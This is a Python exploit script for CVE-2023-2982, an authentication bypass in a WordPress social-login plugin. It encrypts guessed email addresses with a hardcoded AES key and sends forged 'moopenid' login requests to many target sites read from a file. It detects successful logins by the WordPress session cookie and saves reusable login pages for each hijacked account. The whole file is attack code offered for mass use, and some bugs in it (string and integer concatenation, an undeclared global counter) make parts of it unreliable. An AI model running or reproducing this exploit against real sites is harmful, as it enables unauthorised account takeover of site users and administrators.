#!/usr/bin/python3
import re
from urllib.parse import urlparse
import sys
import getopt
import requests
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import random
import string
import requests
import json
import lxml.etree as ET
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()
passphrase = 'jMj7MEdu4wkHObiD'
input_file = "./input.txt" # change the file from here

# Setting User-Agent for all requests.
user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
session.headers.update({'User-Agent': user_agent})
id = 1


def try_login(website_url,email): # website/login
    # format url
    website_url = website_url.rstrip('\/') + '/'

    # encrypt and encode email
    cipher = AES.new(passphrase.encode('utf-8'), AES.MODE_ECB)
    padded_email = pad(email.encode('utf-8'), AES.block_size)
    encrypted_email = cipher.encrypt(padded_email)
    encoded_email = base64.b64encode(encrypted_email).decode('utf-8')
    # post moopenid
    try:
        response = session.post(website_url, headers={'Content-Type': 'application/x-www-form-urlencoded'},
                            data={'option': 'moopenid', 'email': encoded_email, 'appName': 'rlHeqZw2vrPzOiWWfCParA=='},
                            allow_redirects=False,verify=False,timeout=10)

        if any('wordpress_logged_in' in cookie.name for cookie in session.cookies):
            # Opening the file and replacing the desired strings
            with open("login.html", 'r') as file:
                file_content = file.read()
                replaced_content = file_content.replace('WEBSITE_REPLACE', website_url).replace('EMAIL_REPLACE', encoded_email)
                # Writing the updated content back to the file
                with open("login-"+id+".html", 'w') as file:
                    file.write(replaced_content)
                    print("Login Worked!")
                    print("Logged in With:", email, "in", website_url)
                    print("To Login again open login-"+id+".html")
                    id = id + 1
        else:
            print("Login Failed")
    except:
        print("Login Time Out")

def extract():
    with open(input_file, "r") as file:
        lines = file.readlines()
    hashmap = {}
    for line in lines:
        url, users = re.split(" ", line)
        parsed_url = urlparse(url)
        domain_name = parsed_url.netloc
        # Split domain name into parts using "." as separator
        domain_parts = domain_name.split(".")
        # Get the last two parts of the domain name (TLD and domain name)
        tld = domain_parts[-1]
        domain = domain_parts[-2] if len(domain_parts) > 1 else ""
        # Combine the domain name and TLD to form the full domain name
        full_domain_name = f"{domain}.{tld}"
        users = users[1:-2] # delete "[" and delete "]"
        users = re.split(",", users) # make array of the users
        for i in range(len(users)):
            users[i] = [(users[i] + "@" + full_domain_name), (users[i] + "@gmail.com")]
            hashmap[domain_name] = users # { "Domain" : ["users@Domain", "users@gmail.com"] }
    print("The hashmap has been successfully created. Initiating CVE-2023-2982 process. Get ready for some serious action!")
    for website_url, emails in hashmap.items():
        for email_pair  in emails:
            for email in email_pair:
                try_login(( "https://" + website_url),email)

def main():
    extract()

if __name__ == "__main__":
    main()
